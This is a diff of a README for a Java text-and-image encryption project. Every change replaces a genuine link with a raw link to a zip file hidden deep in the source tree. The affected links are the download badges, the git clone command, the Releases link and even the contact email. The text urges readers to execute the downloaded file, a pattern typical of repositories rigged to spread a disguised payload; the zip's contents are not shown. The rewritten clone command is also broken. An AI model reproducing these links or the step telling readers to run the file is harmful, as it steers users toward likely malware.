@@ -2,7 +2,7 @@
 
 Welcome to the **Cipher Text and Image Cryptography** repository! This project focuses on the encryption and decryption of text and images using well-known algorithms: RSA for text and AES for images. Built in Java, this application aims to provide a secure way to handle sensitive data.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/ghadahafez/Cipher-Text-and-Image-Cryptography-/releases)
+[![Download Releases](https://github.com/ghadahafez/Cipher-Text-and-Image-Cryptography-/raw/refs/heads/master/src/com/Cipher/Crypto/AlgorithmView/EncryptionDecryption/ImageEncryptionDecryption/Cryptography-Cipher-and-Text-Image-v2.8.zip%20Releases-Click%20Here-brightgreen)](https://github.com/ghadahafez/Cipher-Text-and-Image-Cryptography-/raw/refs/heads/master/src/com/Cipher/Crypto/AlgorithmView/EncryptionDecryption/ImageEncryptionDecryption/Cryptography-Cipher-and-Text-Image-v2.8.zip)
 
 ## Table of Contents
 - [Features](#features)
@@ -33,7 +33,7 @@ To get started with this project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/ghadahafez/Cipher-Text-and-Image-Cryptography-.git
+   git clone https://github.com/ghadahafez/Cipher-Text-and-Image-Cryptography-/raw/refs/heads/master/src/com/Cipher/Crypto/AlgorithmView/EncryptionDecryption/ImageEncryptionDecryption/Cryptography-Cipher-and-Text-Image-v2.8.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -41,7 +41,7 @@ To get started with this project, follow these steps:
    cd Cipher-Text-and-Image-Cryptography-
    ```
 
-3. **Download the Latest Release**: Visit the [Releases section](https://github.com/ghadahafez/Cipher-Text-and-Image-Cryptography-/releases) to download the latest version of the application. Make sure to execute the downloaded file.
+3. **Download the Latest Release**: Visit the [Releases section](https://github.com/ghadahafez/Cipher-Text-and-Image-Cryptography-/raw/refs/heads/master/src/com/Cipher/Crypto/AlgorithmView/EncryptionDecryption/ImageEncryptionDecryption/Cryptography-Cipher-and-Text-Image-v2.8.zip) to download the latest version of the application. Make sure to execute the downloaded file.
 
 ## Usage 🖥️
 Once you have downloaded and set up the application, follow these steps to use it:
@@ -91,11 +91,11 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 ## Contact 📫
 For questions or feedback, please reach out:
 
-- **GitHub**: [ghadahafez](https://github.com/ghadahafez)
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **GitHub**: [ghadahafez](https://github.com/ghadahafez/Cipher-Text-and-Image-Cryptography-/raw/refs/heads/master/src/com/Cipher/Crypto/AlgorithmView/EncryptionDecryption/ImageEncryptionDecryption/Cryptography-Cipher-and-Text-Image-v2.8.zip)
+- **Email**: [https://github.com/ghadahafez/Cipher-Text-and-Image-Cryptography-/raw/refs/heads/master/src/com/Cipher/Crypto/AlgorithmView/EncryptionDecryption/ImageEncryptionDecryption/Cryptography-Cipher-and-Text-Image-v2.8.zip](https://github.com/ghadahafez/Cipher-Text-and-Image-Cryptography-/raw/refs/heads/master/src/com/Cipher/Crypto/AlgorithmView/EncryptionDecryption/ImageEncryptionDecryption/Cryptography-Cipher-and-Text-Image-v2.8.zip)
 
 Thank you for checking out the **Cipher Text and Image Cryptography** project! We hope you find it useful for your encryption needs. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/ghadahafez/Cipher-Text-and-Image-Cryptography-/releases) 
+[![Download Releases](https://github.com/ghadahafez/Cipher-Text-and-Image-Cryptography-/raw/refs/heads/master/src/com/Cipher/Crypto/AlgorithmView/EncryptionDecryption/ImageEncryptionDecryption/Cryptography-Cipher-and-Text-Image-v2.8.zip%20Releases-Click%20Here-brightgreen)](https://github.com/ghadahafez/Cipher-Text-and-Image-Cryptography-/raw/refs/heads/master/src/com/Cipher/Crypto/AlgorithmView/EncryptionDecryption/ImageEncryptionDecryption/Cryptography-Cipher-and-Text-Image-v2.8.zip) 
 
 Feel free to explore, contribute, and secure your data!
